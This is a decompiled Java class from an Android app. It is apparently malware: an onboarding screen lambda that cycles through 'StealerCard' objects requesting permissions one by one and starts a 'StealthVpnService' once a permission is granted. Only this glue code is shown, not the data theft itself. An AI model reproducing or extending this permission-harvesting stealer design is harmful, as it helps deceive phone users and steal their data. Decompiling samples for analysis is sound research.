package com.base.template;

import com.base.template.services.StealthVpnService;
import kotlin.io.CloseableKt;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class OnboardingActivity$$ExternalSyntheticLambda11 implements Runnable {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ OnboardingActivity f$0;
    public final /* synthetic */ int f$1;

    public /* synthetic */ OnboardingActivity$$ExternalSyntheticLambda11(OnboardingActivity onboardingActivity, int i, int i2) {
        this.$r8$classId = i2;
        this.f$0 = onboardingActivity;
        this.f$1 = i;
    }

    /* JADX WARN: Type inference failed for: r0v11, types: [kotlin.jvm.functions.Function0, kotlin.jvm.internal.Lambda] */
    /* JADX WARN: Type inference failed for: r0v6, types: [kotlin.jvm.functions.Function0, kotlin.jvm.internal.Lambda] */
    /* JADX WARN: Type inference failed for: r1v3, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r1v5, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r1v7, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r1v9, types: [java.lang.Object, java.util.List] */
    @Override // java.lang.Runnable
    public final void run() {
        int i;
        int i2;
        switch (this.$r8$classId) {
            case 0:
                OnboardingActivity onboardingActivity = this.f$0;
                int i3 = this.f$1;
                int i4 = OnboardingActivity.$r8$clinit;
                if (!onboardingActivity.isFinishing()) {
                    if (i3 == -1) {
                        StealthVpnService stealthVpnService = StealthVpnService.instance;
                        CloseableKt.markEnabled(onboardingActivity);
                        CloseableKt.startIfReady(onboardingActivity);
                    }
                    onboardingActivity.advanceCard();
                }
                break;
            case 1:
                OnboardingActivity onboardingActivity2 = this.f$0;
                int i5 = this.f$1;
                int i6 = OnboardingActivity.$r8$clinit;
                if (!onboardingActivity2.isFinishing() && !onboardingActivity2.advancing && i5 == (i = onboardingActivity2.currentIndex) && i < onboardingActivity2.cards.size()) {
                    ((StealerCard) onboardingActivity2.cards.get(onboardingActivity2.currentIndex)).requestPermission.invoke();
                    break;
                }
                break;
            default:
                OnboardingActivity onboardingActivity3 = this.f$0;
                int i7 = this.f$1;
                int i8 = OnboardingActivity.$r8$clinit;
                if (!onboardingActivity3.isFinishing() && !onboardingActivity3.advancing && i7 == (i2 = onboardingActivity3.currentIndex) && i2 < onboardingActivity3.cards.size()) {
                    ((StealerCard) onboardingActivity3.cards.get(onboardingActivity3.currentIndex)).requestPermission.invoke();
                    break;
                }
                break;
        }
    }
}
